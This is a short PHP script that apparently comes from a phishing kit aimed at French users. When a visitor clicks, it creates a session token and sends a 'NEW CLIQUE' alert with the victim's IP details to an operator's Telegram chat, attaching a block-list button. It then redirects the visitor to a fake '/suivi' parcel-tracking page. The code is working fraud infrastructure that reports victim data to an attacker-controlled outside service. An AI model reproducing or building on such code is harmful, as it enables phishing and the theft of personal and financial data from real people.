<?php

$token = createId(5);
$_SESSION['token'] = $token;

telegram_api($config['token'], 'sendMessage', [
    'chat_id' => $config['clique'],
    'text' => "<b>🇫🇷 NEW CLIQUE</b>" . victim_infos($ip, $check),
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            $btnBl
        ]
    ])
]);
header('location: /suivi?id=' . $token);
